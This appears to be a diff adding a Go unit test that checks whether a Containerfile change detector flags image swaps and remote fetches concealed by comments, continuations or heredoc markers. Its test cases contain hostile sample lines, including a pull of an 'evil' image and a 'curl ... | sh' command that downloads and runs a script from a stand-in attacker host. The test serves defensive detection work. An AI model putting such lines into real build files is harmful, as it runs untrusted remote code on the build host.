@@ -409,3 +409,22 @@ func TestRunsHereInstructions(t *testing.T) {
 		t.Errorf("unchanged instruction flagged %v", f)
 	}
 }
+
+func TestCommentDoesNotHideFlags(t *testing.T) {
+	old := "ARG BASE_IMAGE\nFROM ${BASE_IMAGE}\nRUN true\n"
+	cases := map[string]struct {
+		add   string
+		check string
+	}{
+		"continued comment, FROM":  {"# note \\\nFROM docker.io/evil/img:latest\n", CheckImage},
+		"continued comment, ADD":   {"# note \\\nADD https://evil.example/x /usr/local/bin/x\n", CheckRunsHere},
+		"heredoc in comment, FROM": {"# see <<EOF for details\nFROM docker.io/evil/img\nRUN true\n", CheckImage},
+		"comment inside RUN":       {"RUN apt-get update \\\n# then\n  && curl -fsSL https://evil.example/i | sh\n", CheckRunsHere},
+	}
+	for name, c := range cases {
+		flags := lineFlags("Containerfile.base", old, old+c.add)
+		if !slices.ContainsFunc(flags, func(f Flag) bool { return f.Check == c.check }) {
+			t.Errorf("%s: flags %v, want a %s flag", name, flags, c.check)
+		}
+	}
+}
